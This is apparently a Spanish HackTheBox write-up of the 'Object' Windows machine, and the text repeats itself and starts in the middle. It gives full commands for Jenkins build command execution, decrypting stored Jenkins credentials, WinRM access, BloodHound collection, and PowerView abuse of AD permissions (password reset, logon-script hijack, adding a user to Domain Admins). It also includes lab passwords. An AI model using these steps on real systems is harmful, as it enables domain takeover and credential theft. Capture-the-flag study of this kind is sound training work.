[::]:49695             [::]:0                 LISTENING       2928\\n  TCP    [::]:62258             [::]:0                 LISTENING       2872\\n  TCP    [::1]:53               [::]:0                 LISTENING       2928\\n  TCP    [dead:beef::84]:53     [::]:0                 LISTENING       2928\\n  TCP    [dead:beef::eddf:29ac:70d6:2b4b]:53  [::]:0                 LISTENING       2928\\n  TCP    [fe80::eddf:29ac:70d6:2b4b%12]:53  [::]:0                 LISTENING       2928\\n\\n~~~\\n\\nAl parecer es una Servidor Active Directory\\n\\nSubimos el archivo SharpHound.ps1 para buscar vectores de ataque:\\n\\n~~~bash\\nPS C:\\\\Users\\\\oliver\\\\Desktop\u003e upload /home/kali/HTB/machines/res/SharpHound.ps1\\nInfo: Uploading /home/kali/HTB/machines/res/SharpHound.ps1 to C:\\\\Users\\\\oliver\\\\Desktop\\\\SharpHound.ps1\\n\\n                                                             \\nData: 1298980 bytes of 1298980 bytes copied\\n\\nInfo: Upload successful!\\n\\n~~~\\n\\nLuego lo ejecutamos:\\n\\n~~~bash\\n. .\\\\SharpHound.ps1\\nInvoke-BloodHound -CollectionMethod All\\n~~~\\n\\nRevisamos loa archivos creados\\n\\n~~~bash\\nls\\n\\n\\n    Directory: C:\\\\Users\\\\oliver\\\\desktop\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\n-a----        6/21/2022   6:40 AM           9060 20220621064046_BloodHound.zip\\n-a----        6/21/2022   6:40 AM          10043 MWU2MmE0MDctMjBkZi00N2VjLTliOTMtYThjYTY4MjdhZDA2.bin\\n-a----        6/21/2022   6:35 AM         974235 SharpHound.ps1\\n-ar---        6/21/2022   4:56 AM             34 user.txt\\n\\n~~~\\n\\nDescargamos el archivo .zip\\n\\n## Elevación de privilegios\\n\\nLo importamos en bloodhound y luego buscamos el path mas corto para llegar a admin\\n\\n![](/Object/Pasted_image_20220621111052.png)\\n\\n- Desde oliver a smith forcechangepassword\\n- Desde smith a maria GenericWrite\\n- Desde maria a Administrador WriteOwner\\n\\nPara entender como explotar el cambio de contraseña para el usuario smith presionamos click derecho sobre ForceChangePassword\\n\\n![](/Object/Pasted_image_20220621111719.png)\\n\\n![](/Object/Pasted_image_20220621111731.png)\\n\\n## Consiguiendo el usuario Smith \\n\\nNos sugiere instalar powerview y hacer el cambio de contraseña con esta herramienta:\\n\\n~~~powershell\\n . .\\\\powerview.ps1\\n~~~\\nLuego ejecutamos los siguientes comandos:\\n\\n~~~powershell\\n$newpass = ConvertTo-SecureString 'Password1234#' -AsPlainText -Force\\n~~~\\n\\n~~~powershell\\nSet-DomainUserPassword -Identity smith -AccountPassword $newpass\\n~~~\\n\\nAhora el usuario smith posee las siguientes credenciales\\n\\n- User: smith\\n- Password: Password1234#\\n\\nVerificamos si tenemos acceso al sistema mediante WinRM con el usuario smith\\n\\n~~~powershell\\nevil-winrm -i 10.129.90.135 -u smith -p 'Password1234#'                            \\n\\nEvil-WinRM shell v3.3\\n\\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\\n\\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\\n\\nInfo: Establishing connection to remote endpoint\\n\\n*Evil-WinRM* PS C:\\\\Users\\\\smith\\\\Documents\u003e \\n~~~\\n\\n## Consiguiendo el usuario Maria\\n\\nPara conseguir acceso al usuario maria, Bloodhound nos sugiere utilizar nuevamente el modulo powerview.ps1 junto con sus componentes Set-DomainObject y Get-DomainSPNTicket\\n\\nSin embargo, el ataque no fue exitoso, Hacktricks sugiere que se puede usar el GenericWrite para modificar los script de logon.\\n\\nhttps://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#genericwrite-on-user\\n\\nPor lo que usamos los siguientes comandos\\n\\n~~~powershell \\necho \\\"ls \\\\users\\\\maria \u003e c:\\\\tmp\\\\out\\\" \u003e cmd.ps1\\n~~~\\n\\n~~~powershell\\nSet-DomainObject -Identity maria -SET @{scriptpath=\\\"C:\\\\\\\\tmp\\\\\\\\cmd.ps1\\\"}\\n~~~\\n\\nLuego leemos el archivo out y vemos lo siguiente\\n\\n~~~powershell\\ntype out\\n\\n\\n    Directory: C:\\\\users\\\\maria\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\nd-r---       10/22/2021   3:54 AM                3D Objects\\nd-r---       10/22/2021   3:54 AM                Contacts\\nd-r---       10/25/2021   3:47 AM                Desktop\\nd-r---       10/25/2021  10:07 PM                Documents\\nd-r---       10/22/2021   3:54 AM                Downloads\\nd-r---       10/22/2021   3:54 AM                Favorites\\nd-r---       10/22/2021   3:54 AM                Links\\nd-r---       10/22/2021   3:54 AM                Music\\nd-r---       10/22/2021   3:54 AM                PictuObject\\nd-r---       10/22/2021   3:54 AM                Saved Games\\nd-r---       10/22/2021   3:54 AM                Searches\\nd-r---       10/22/2021   3:54 AM                Videos\\n~~~\\n\\nNotamos que el directorio Documents ha sifo modificado recientemente\\n\\n~~~powershell\\necho \\\"ls \\\\users\\\\maria\\\\desktop \u003e \\\\tmp\\\\out \\\" \u003e cmd.ps1\\n~~~\\n \\n Y conseguimos el siguiente archivo\\n \\n~~~powershell\\ncat out\\n\\nDirectory: C:\\\\users\\\\maria\\\\desktop\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\n-a----       10/26/2021   8:13 AM           6144 Engines.xls\\n\\n ~~~\\n\\nModificamos el archivo cmd.ps1:\\n\\n~~~powershell\\necho \\\"copy \\\\users\\\\maria\\\\desktop\\\\Engines.xls  \\\\tmp\\\\ \\\" \u003e cmd.ps1\\n~~~\\n\\n\\n~~~powershell\\nls\\n\\n\\n    Directory: C:\\\\tmp\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\n-a----        6/21/2022   8:03 AM             96 cmd.ps1\\n-a----       10/26/2021   8:13 AM           6144 Engines.xls\\n-a----        6/21/2022   8:02 AM            830 out\\n-a----        6/21/2022   7:59 AM            830 out2\\n\\n~~~\\n\\n\\nDescargamos el archivo a nuestra VM. Luego convertimos el archivo a csv\\n\\n~~~bash\\nssconvert Engines.xls engine.csv\\n~~~\\n\\nY vemos su contenido\\n\\n~~~bash\\ncat engine.csv                           \\n\\\"Machines Information\\\",,,,,\\nName,Quantity,\\\"Date Acquired\\\",Owner,\\\"Chamber Username\\\",\\\"Chamber Password\\\"\\n\\\"Internal Combustion Engine\\\",12,2021/10/02,HTB,maria,d34gb8@\\n\\\"Stirling Engine\\\",23,2021/11/05,HTB,maria,0de_434_d545\\n\\\"Diesel Engine\\\",4,2021/02/03,HTB,maria,W3llcr4ft3d_4cls\\n~~~\\n\\nIntentamos acceder al sistema mediante WinRM como el usuario maria utilizando las contraseñas indicadas en el CSV\\n\\n## Administrador\\n\\nBloodHound nuevamente nos sugiere instalar el modulo PowerView para luego modificar  el grupo de administradores y hacer que maria sea parte de este grupo\\n\\nDefinimos a maria como el dueño del grupo Domain Admins\\n\\n~~~powershell\\nSet-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'\\n~~~\\n\\nAsiganmos todos los derechos del grupo a maria\\n\\n~~~powershell\\nAdd-DomainObjectAcl -TargetIdentity \\\"Domain Admins\\\" -PrincipalIdentity maria -Rights All\\n~~~\\n\\nAgregamos a maria al grupo Domain Admins\\n\\n~~~powershell\\nAdd-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'\\n~~~\\n\\nVerificamos a que grupos pertenece maria\\n\\n~~~powershell\\n*Evil-WinRM* PS C:\\\\Users\\\\maria\\\\Documents\u003e net user maria\\nUser name                    maria\\nFull Name                    maria garcia\\nComment\\nUser's comment\\nCountry/region code          000 (System Default)\\nAccount active               Yes\\nAccount expires              Never\\n\\nPassword last set            10/21/2021 9:16:32 PM\\nPassword expires             Never\\nPassword changeable          10/22/2021 9:16:32 PM\\nPassword required            Yes\\nUser may change password     Yes\\n\\nWorkstations allowed         All\\nLogon script                 C:\\\\\\\\tmp\\\\\\\\cmd.ps1\\nUser profile\\nHome directory\\nLast logon                   6/21/2022 4:56:41 AM\\n\\nLogon hours allowed          All\\n\\nLocal Group Memberships      *Remote Management Use\\nGlobal Group memberships     *Domain Admins        *Domain Users\\nThe command completed successfully.\\n~~~\\n\\nFinalmente tenemos acceso como Administrador al sistema\",\"data\":{\"title\":\"HackTheBox - Máquina Object\",\"subtitle\":\"Paso a paso de la explotación de la maquina Object de HackTheBox.\",\"dificultad\":\"Hard\",\"os\":\"Sistema Operativo Windows\",\"date\":\"2024-02-10T00:00:00.000Z\",\"tags\":[\"HackTheBox\"]},\"content\":\"\\n## Port Enumeration\\n\\n### TCP \\n\\nEnumeración de puertos TCP\\n\\n~~~ bash\\nsudo nmap -sS -p80,5985,8080 10.129.96.147 -A -Pn             \\n[sudo] password for kali: \\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 18:18 EDT\\nNmap scan report for 10.129.96.147\\nHost is up (0.13s latency).\\n\\nPORT     STATE SERVICE VERSION\\n80/tcp   open  http    Microsoft IIS httpd 10.0\\n|_http-title: Mega Engines\\n| http-methods: \\n|_  Potentially risky methods: TRACE\\n|_http-server-header: Microsoft-IIS/10.0\\n5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\\n|_http-title: Not Found\\n|_http-server-header: Microsoft-HTTPAPI/2.0\\n8080/tcp open  http    Jetty 9.4.43.v20210629\\n| http-robots.txt: 1 disallowed entry \\n|_/\\n|_http-title: Site doesn't have a title (text/html;charset=utf-8).\\n|_http-server-header: Jetty(9.4.43.v20210629)\\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\\nNo OS matches for host\\nNetwork Distance: 2 hops\\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\\n\\nTRACEROUTE (using port 8080/tcp)\\nHOP RTT       ADDRESS\\n1   126.52 ms 10.10.14.1\\n2   126.92 ms 10.129.96.147\\n\\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\\nNmap done: 1 IP address (1 host up) scanned in 15.22 seconds\\n\\n~~~\\n\\n    \\n\\n### UDP\\n  \\n Enumeración de UDP\\n \\n~~~ bash\\nsudo nmap -sU -F 10.129.96.147 -T5                \\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 18:19 EDT\\nNmap scan report for 10.129.96.147\\nHost is up (0.13s latency).\\nNot shown: 98 open|filtered udp ports (no-response)\\nPORT    STATE SERVICE\\n53/udp  open  domain\\n123/udp open  ntp\\n\\nNmap done: 1 IP address (1 host up) scanned in 4.44 seconds\\n\\n~~~\\n\\n## Enumeracion de Servicios   \\n\\n### HTTP port 80:\\n\\nLa enumeración con Gobuster dio como resultado que no existen otros directorios ni dominios adicionales\\n\\nBanner Grabbing\\n\\n~~~http\\nHTTP/1.1 200 OK\\nContent-Type: text/html\\nLast-Modified: Tue, 26 Oct 2021 06:21:32 GMT\\nAccept-Ranges: bytes\\nETag: \\\"61128db831cad71:0\\\"\\nServer: Microsoft-IIS/10.0\\nDate: Mon, 20 Jun 2022 21:11:13 GMT\\nConnection: close\\nContent-Length: 29932\\n~~~\\n\\n![](/Object/Pasted_image_20220620182027.png)\\n\\nIngresamos al link automation\\n\\nY nos redirige al dominio object.htb:8080. Por lo que agregamos el dominio /etc/hosts\\n\\nLuego de agregar el dominio al archivo /etc/hosts ingresamos nuevamente a la aplicación web en puerto 8080\\n\\n![](/Object/Pasted_image_20220620182300.png)\\n\\nContenido del archivo robots.txt\\n\\n~~~ bash\\n# we don't want robots to click \\\"build\\\" links\\nUser-agent: *\\nDisallow: /\\n~~~\\n\\nCreamos un usuario y logramos ingresar al sistema\\n\\n![](/Object/Pasted_image_20220620182550.png)\\n\\n## Vulnerabilities analysis\\n\\nLa siguiente página nos indica que es posible ejecutar comandos en el sistema mediante la creación de builds\\n\\nhttps://book.hacktricks.xyz/cloud-security/jenkins\\n\\nCreamos un nuevo proyecto \\n\\nVamos a la sección de triggers\\n\\nY configuramos lo siguiente\\n\\n![](/Object/Pasted_image_20220621071436.png)\\n\\nEsto lo hacemos para que se ejecute el Build donde ingresaremos nuestro comando\\n\\nEn Build presionamos sobre el botón Add build step y seleccionamos Execute Windows batch command. Luego, agregamos lo siguiente:\\n\\n![](/Object/Pasted_image_20220621071556.png)\\n\\nEsperamos unos minutos y vemos el resultado\\n\\n![](/Object/Pasted_image_20220621071328.png)\\n\\nEl software está ejecutandose como el usuario oliver\\n\\n# Explotation\\n\\nIntentaremos verificar que el sistema no tiene habilitado algun firewall\\n\\n![](/Object/Pasted_image_20220621072459.png)\\n\\nCon python creamos un servidor http a la esucha y vemos si es posible la conexión\\n\\n![](/Object/Pasted_image_20220621072512.png)\\n\\nComenzamos a enumera el sistema y extraer alguna información que nos sea util \\n\\nEnumeramos los directorios\\n\\n![](/Object/Pasted_image_20220621073347.png)\\n\\nLuego consultamos el directorio C:\\\\Users\\\\oliver\\\\AppData\\\\Local\\\\Jenkins\\\\.jenkins\\n\\n![](/Object/Pasted_image_20220621073716.png)\\n\\nSegún el siguiente sitio: https://stackoverflow.com/questions/52930545/what-is-the-purpose-of-the-jenkins-user-folder-and-what-are-these-config-files\\n\\nEl archivo config.xml del directorio users contiene información de los usuarios del sistema. Por lo que intentaremos acceder al contenido del archivo.\\n\\nC:\\\\Users\\\\oliver\\\\AppData\\\\Local\\\\Jenkins\\\\.jenkins\\\\users\\\\leftraro_9491939160013366012\\\\config.xml\\n\\n~~~xml\\n\u003c?xml version='1.1' encoding='UTF-8'?\u003e\\n\u003cuser\u003e\\n  \u003cversion\u003e10\u003c/version\u003e\\n  \u003cid\u003eleftraro\u003c/id\u003e\\n  \u003cfullName\u003eleftraro\u003c/fullName\u003e\\n  \u003cproperties\u003e\\n    \u003cjenkins.security.ApiTokenProperty\u003e\\n      \u003ctokenStore\u003e\\n        \u003ctokenList/\u003e\\n      \u003c/tokenStore\u003e\\n    \u003c/jenkins.security.ApiTokenProperty\u003e\\n    \u003ccom.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=\\\"credentials@2.6.1\\\"\u003e\\n      \u003cdomainCredentialsMap class=\\\"hudson.util.CopyOnWriteMap$Hash\\\"/\u003e\\n    \u003c/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty\u003e\\n    \u003chudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin=\\\"email-ext@2.84\\\"\u003e\\n      \u003ctriggers/\u003e\\n    \u003c/hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty\u003e\\n    \u003chudson.model.MyViewsProperty\u003e\\n      \u003cviews\u003e\\n        \u003chudson.model.AllView\u003e\\n          \u003cowner class=\\\"hudson.model.MyViewsProperty\\\" reference=\\\"../../..\\\"/\u003e\\n          \u003cname\u003eall\u003c/name\u003e\\n          \u003cfilterExecutors\u003efalse\u003c/filterExecutors\u003e\\n          \u003cfilterQueue\u003efalse\u003c/filterQueue\u003e\\n          \u003cproperties class=\\\"hudson.model.View$PropertyList\\\"/\u003e\\n        \u003c/hudson.model.AllView\u003e\\n      \u003c/views\u003e\\n    \u003c/hudson.model.MyViewsProperty\u003e\\n    \u003corg.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=\\\"display-url-api@2.3.5\\\"\u003e\\n      \u003cproviderId\u003edefault\u003c/providerId\u003e\\n    \u003c/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty\u003e\\n    \u003chudson.model.PaneStatusProperties\u003e\\n      \u003ccollapsed/\u003e\\n    \u003c/hudson.model.PaneStatusProperties\u003e\\n    \u003cjenkins.security.seed.UserSeedProperty\u003e\\n      \u003cseed\u003e0a9baf906da7ec2b\u003c/seed\u003e\\n    \u003c/jenkins.security.seed.UserSeedProperty\u003e\\n    \u003chudson.search.UserSearchProperty\u003e\\n      \u003cinsensitiveSearch\u003etrue\u003c/insensitiveSearch\u003e\\n    \u003c/hudson.search.UserSearchProperty\u003e\\n    \u003chudson.model.TimeZoneProperty/\u003e\\n    \u003chudson.security.HudsonPrivateSecurityRealm_-Details\u003e\\n      \u003cpasswordHash\u003e#jbcrypt:$2a$10$Y4W8YbX0jiPJDGgfKcnhauOpdZ84NoaZeI/HP76dSqxQTxzShlHqO\u003c/passwordHash\u003e\\n    \u003c/hudson.security.HudsonPrivateSecurityRealm_-Details\u003e\\n    \u003chudson.tasks.Mailer_-UserProperty plugin=\\\"mailer@1.34\\\"\u003e\\n      \u003cemailAddress\u003eleftraro@asdas.cl\u003c/emailAddress\u003e\\n    \u003c/hudson.tasks.Mailer_-UserProperty\u003e\\n    \u003cjenkins.security.LastGrantedAuthoritiesProperty\u003e\\n      \u003croles\u003e\\n        \u003cstring\u003eauthenticated\u003c/string\u003e\\n      \u003c/roles\u003e\\n      \u003ctimestamp\u003e1655809043400\u003c/timestamp\u003e\\n    \u003c/jenkins.security.LastGrantedAuthoritiesProperty\u003e\\n  \u003c/properties\u003e\\n\u003c/user\u003e\\n~~~\\n\\nLuego consultamos el del usuario admin\\n\\ntype C:\\\\Users\\\\oliver\\\\AppData\\\\Local\\\\Jenkins\\\\.jenkins\\\\users\\\\\\n\\n~~~xml\\n\u003c?xml version='1.1' encoding='UTF-8'?\u003e\\n\u003cuser\u003e\\n  \u003cversion\u003e10\u003c/version\u003e\\n  \u003cid\u003eadmin\u003c/id\u003e\\n  \u003cfullName\u003eadmin\u003c/fullName\u003e\\n  \u003cproperties\u003e\\n    \u003ccom.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=\\\"credentials@2.6.1\\\"\u003e\\n      \u003cdomainCredentialsMap class=\\\"hudson.util.CopyOnWriteMap$Hash\\\"\u003e\\n        \u003centry\u003e\\n          \u003ccom.cloudbees.plugins.credentials.domains.Domain\u003e\\n            \u003cspecifications/\u003e\\n          \u003c/com.cloudbees.plugins.credentials.domains.Domain\u003e\\n          \u003cjava.util.concurrent.CopyOnWriteArrayList\u003e\\n            \u003ccom.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl\u003e\\n              \u003cid\u003e320a60b9-1e5c-4399-8afe-44466c9cde9e\u003c/id\u003e\\n              \u003cdescription\u003e\u003c/description\u003e\\n              \u003cusername\u003eoliver\u003c/username\u003e\\n              \u003cpassword\u003e{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}\u003c/password\u003e\\n              \u003cusernameSecret\u003efalse\u003c/usernameSecret\u003e\\n            \u003c/com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl\u003e\\n          \u003c/java.util.concurrent.CopyOnWriteArrayList\u003e\\n        \u003c/entry\u003e\\n      \u003c/domainCredentialsMap\u003e\\n    \u003c/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty\u003e\\n    \u003chudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin=\\\"email-ext@2.84\\\"\u003e\\n      \u003ctriggers/\u003e\\n    \u003c/hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty\u003e\\n    \u003chudson.model.MyViewsProperty\u003e\\n      \u003cviews\u003e\\n        \u003chudson.model.AllView\u003e\\n          \u003cowner class=\\\"hudson.model.MyViewsProperty\\\" reference=\\\"../../..\\\"/\u003e\\n          \u003cname\u003eall\u003c/name\u003e\\n          \u003cfilterExecutors\u003efalse\u003c/filterExecutors\u003e\\n          \u003cfilterQueue\u003efalse\u003c/filterQueue\u003e\\n          \u003cproperties class=\\\"hudson.model.View$PropertyList\\\"/\u003e\\n        \u003c/hudson.model.AllView\u003e\\n      \u003c/views\u003e\\n    \u003c/hudson.model.MyViewsProperty\u003e\\n    \u003corg.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=\\\"display-url-api@2.3.5\\\"\u003e\\n      \u003cproviderId\u003edefault\u003c/providerId\u003e\\n    \u003c/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty\u003e\\n    \u003chudson.model.PaneStatusProperties\u003e\\n      \u003ccollapsed/\u003e\\n    \u003c/hudson.model.PaneStatusProperties\u003e\\n    \u003cjenkins.security.seed.UserSeedProperty\u003e\\n      \u003cseed\u003eea75b5bd80e4763e\u003c/seed\u003e\\n    \u003c/jenkins.security.seed.UserSeedProperty\u003e\\n    \u003chudson.search.UserSearchProperty\u003e\\n      \u003cinsensitiveSearch\u003etrue\u003c/insensitiveSearch\u003e\\n    \u003c/hudson.search.UserSearchProperty\u003e\\n    \u003chudson.model.TimeZoneProperty/\u003e\\n    \u003chudson.security.HudsonPrivateSecurityRealm_-Details\u003e\\n      \u003cpasswordHash\u003e#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW\u003c/passwordHash\u003e\\n    \u003c/hudson.security.HudsonPrivateSecurityRealm_-Details\u003e\\n    \u003chudson.tasks.Mailer_-UserProperty plugin=\\\"mailer@1.34\\\"\u003e\\n      \u003cemailAddress\u003eadmin@object.local\u003c/emailAddress\u003e\\n    \u003c/hudson.tasks.Mailer_-UserProperty\u003e\\n    \u003cjenkins.security.ApiTokenProperty\u003e\\n      \u003ctokenStore\u003e\\n        \u003ctokenList/\u003e\\n      \u003c/tokenStore\u003e\\n    \u003c/jenkins.security.ApiTokenProperty\u003e\\n    \u003cjenkins.security.LastGrantedAuthoritiesProperty\u003e\\n      \u003croles\u003e\\n        \u003cstring\u003eauthenticated\u003c/string\u003e\\n      \u003c/roles\u003e\\n      \u003ctimestamp\u003e1634793332195\u003c/timestamp\u003e\\n    \u003c/jenkins.security.LastGrantedAuthoritiesProperty\u003e\\n  \u003c/properties\u003e\\n\u003c/user\u003e\\n~~~\\n\\nPara extraer las contraseñas podemos utilizar el siguiente script en python\\n\\n\\nDebemos descargar dos archivos \\n\\n- master.key \\n- hudson.util.Secret\\n\\nComo este ultimo es un binario, lo convertiremos a base64 y luego lo decodificaremos y guardaremos en nuestro sistema:\\n\\n~~~\\npowershell -c [convert]::ToBase64String((cat C:\\\\Users\\\\oliver\\\\AppData\\\\Local\\\\Jenkins\\\\.jenkins\\\\secrets\\\\hudson.util.Secret -Encoding byte))\\n~~~\\n\\nhudson.util.Secret\\n\\n~~~\\ngWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=\\n~~~\\n\\nmaster.key\\n\\n~~~\\nZjY3M2ZkYjBjNGZjYzMzOTA3MDQzNWJkYmUxYTAzOWQ4M2E1OTdiZjIxZWFmYmI3ZjliMzViNTBmY2UwMDZlNTY0Y2ZmNDU2NTUzZWQ3M2NiMWZhNTY4YjY4YjMxMGFkZGM1NzZmMTYzN2E3ZmU3MzQxNGE0YzZmZjEwYjRlMjNhZGM1MzhlOWIzNjlhMGM2ZGU4ZmMyOTlkZmEyYTM5MDRlYzczYTI0YWE0ODU1MGIyNzZiZTUxZjkxNjU2Nzk1OTViMmNhYzAzY2MyMDQ0ZjNjNzAyZDY3NzE2OWUyZjRkM2JkOTZkODMyMWEyZTE5ZTJiZjBjNzZmZTMxZGIxOQ==\\n~~~\\n\\nDescodificamos los archivo y ejecutamos el script:\\n\\n~~~bash\\npython decrypt.py master.key hudson.util.Secret config.xml\\nc1cdfun_d2434\\n~~~\\n\\n## Getting a shell\\n\\nAhora con las credenciales del usuario oliver podemos usar el servicio WinRM\\n\\n- User: oliver\\n- Password: c1cdfun_d2434\\n\\n~~~ bash\\nevil-winrm -i 10.129.90.135 -u oliver -p c1cdfun_d2434\\n\\nEvil-WinRM shell v3.3\\n\\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\\n\\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\\n\\nInfo: Establishing connection to remote endpoint\\n\\n*Evil-WinRM* PS C:\\\\Users\\\\oliver\\\\Documents\u003e whoami\\nobject\\\\oliver\\n*Evil-WinRM* PS C:\\\\Users\\\\oliver\\\\Documents\u003e \\n\\n~~~\\n\\n## System Enumeration\\n\\nUsuarios del sistema\\n\\n~~~ bash\\n*Evil-WinRM* PS C:\\\\Users\u003e ls\\n\\n\\n    Directory: C:\\\\Users\\n\\n\\nMode                LastWriteTime         Length Name\\n----                -------------         ------ ----\\nd-----       11/10/2021   3:20 AM                Administrator\\nd-----       10/26/2021   7:59 AM                maria\\nd-----       10/26/2021   7:58 AM                oliver\\nd-r---        4/10/2020  10:49 AM                Public\\nd-----       10/21/2021   3:44 AM                smith\\n\\n~~~\\n\\nServicios que esten a la esucha en algun puerto\\n\\n~~~bash\\n*Evil-WinRM* PS C:\\\\Users\u003e netstat -ano | findstr LISTENING\\n  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4\\n  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       900\\n  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4\\n  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       900\\n  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4\\n  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       5644\\n  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2796\\n  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4\\n  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       484\\n  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1160\\n  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1520\\n  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       648\\n  TCP    0.0.0.0:49684          0.0.0.0:0              LISTENING       628\\n  TCP    0.0.0.0:49695          0.0.0.0:0              LISTENING       2928\\n  TCP    0.0.0.0:62258          0.0.0.0:0              LISTENING       2872\\n  TCP    10.129.90.135:53       0.0.0.0:0              LISTENING       2928\\n  TCP    10.129.90.135:139      0.0.0.0:0              LISTENING       4\\n  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2928\\n  TCP    [::]:80                [::]:0                 LISTENING       4\\n  TCP    [::]:88                [::]:0                 LISTENING       648\\n  TCP    [::]:135               [::]:0                 LISTENING       900\\n  TCP    [::]:389               [::]:0                 LISTENING       648\\n  TCP    [::]:445               [::]:0                 LISTENING       4\\n  TCP    [::]:464               [::]:0                 LISTENING       648\\n  TCP    [::]:593               [::]:0                 LISTENING       900\\n  TCP    [::]:636               [::]:0                 LISTENING       648\\n  TCP    [::]:3268              [::]:0                 LISTENING       648\\n  TCP    [::]:3269              [::]:0                 LISTENING       648\\n  TCP    [::]:5985              [::]:0                 LISTENING       4\\n  TCP    [::]:8080              [::]:0                 LISTENING       5644\\n  TCP    [::]:9389              [::]:0                 LISTENING       2796\\n  TCP    [::]:47001             [::]:0                 LISTENING       4\\n  TCP    [::]:49664             [::]:0                 LISTENING       484\\n  TCP    [::]:49665             [::]:0                 LISTENING       1160\\n  TCP    [::]:49666             [::]:0                 LISTENING       1520\\n  TCP    [::]:49667             [::]:0                 LISTENING       648\\n  TCP    [::]:49673             [::]:0                 LISTENING       648\\n  TCP    [::]:49674             [::]:0                 LISTENING       648\\n  TCP    [::]:49684             [::]:0                 LISTENING       628\\n  TCP    [::]:49695             [::]:0                 LISTENING       2928\\n  TCP    [::]:62258             [::]:0                 LISTENING       2872\\n  TCP    [::1]:53               [::]:0                 LISTENING       2928\\n  TCP    [dead:beef::84]:53     [::]:0                 LISTENING       2928\\n  TCP    [dead:beef::eddf:29ac:70d6:2b4b]:53  [::]:0                 LISTENING       2928\\n  TCP    [fe80::eddf:29ac:70d6:2b4b%12]:53  [::]:0                 LISTENING       2928\\n\\n~~~\\n\\nAl parecer es una Servidor Active Directory\\n\\nSubimos el archivo SharpHound.ps1 para buscar vectores de ataque:\\n\\n~~~bash\\nPS C:\\\\Users\\\\oliver\\\\Desktop\u003e upload /home/kali/HTB/machines/res/SharpHound.ps1\\nInfo: Uploading /home/kali/HTB/machines/res/SharpHound.ps1 to C:\\\\Users\\\\oliver\\\\Desktop\\\\SharpHound.ps1\\n\\n                                                             \\nData: 1298980 bytes of 1298980 bytes copied\\n\\nInfo: Upload successful!\\n\\n~~~\\n\\nLuego lo ejecutamos:\\n\\n~~~bash\\n. .\\\\SharpHound.ps1\\nInvoke-BloodHound -CollectionMethod All\\n~~~\\n\\nRevisamos loa archivos creados\\n\\n~~~bash\\nls\\n\\n\\n    Directory: C:\\\\Users\\\\oliver\\\\desktop\\n\\n\\nMode                LastWriteTime         Length 